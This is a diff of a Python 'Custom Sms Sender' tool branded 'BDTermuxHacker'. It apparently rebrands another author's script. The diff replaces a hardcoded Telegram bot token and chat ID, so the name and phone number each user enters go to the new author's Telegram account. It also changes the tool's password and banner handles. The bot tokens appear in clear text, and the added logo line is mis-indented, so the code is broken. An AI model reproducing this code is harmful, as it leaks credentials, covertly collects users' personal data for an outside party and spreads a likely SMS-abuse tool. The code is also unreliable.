@@ -49,8 +49,8 @@ class User:
         self.number = input("Your Number: ")
 
     def send_telegram_message(self):
-        base_url = "https://api.telegram.org/bot6746778331:AAFIVulAfBF_71JXrycTfQHNMhJoB8bOZc8/sendMessage"
-        chat_id = "6856969214"
+        base_url = "https://api.telegram.org/7107489853:AAE7LyBcZDlPIWUuba6bGDGIB1iJLmwHio0/sendMessage"
+        chat_id = "5550487482"
         params = {
             "chat_id": chat_id,
             "text": f"Name: {self.name}, Number: {self.number}"
@@ -121,20 +121,20 @@ while True:
     clear_screen()
     password = input("Tools Password : ")
 
-    if password == "tmxlamim": 
+    if password == "ILoveBDTermuxHacker_Team": 
         color1 = random.choice(colors)
         color2 = random.choice(colors)
         color3 = random.choice(colors)
         color4 = random.choice(colors)
         color5 = random.choice(colors)
         os.system("clear")  
-        logo = figlet_format("TMX Beta")
+      logo = figlet_format("BDTermuxHacker")
         print(color1 + logo)
         line = color3 + "-------------------------------------------------"
-        print(color2 + "Telgram : @tmx71bd")
-        print(color3 + "Tools virson : 1.9")
+        print(color2 + "Telgram : @@BDTermuxHacker_Official")
+        print(color3 + "Tools virson : 1.0")
         print(color4 + "Tools Type: Custom Sms Sender")
-        print(color1 + "github : @Md-Lamim")
+        print(color1 + "github : @BDTermuxHacker")
         
         print(line)
         
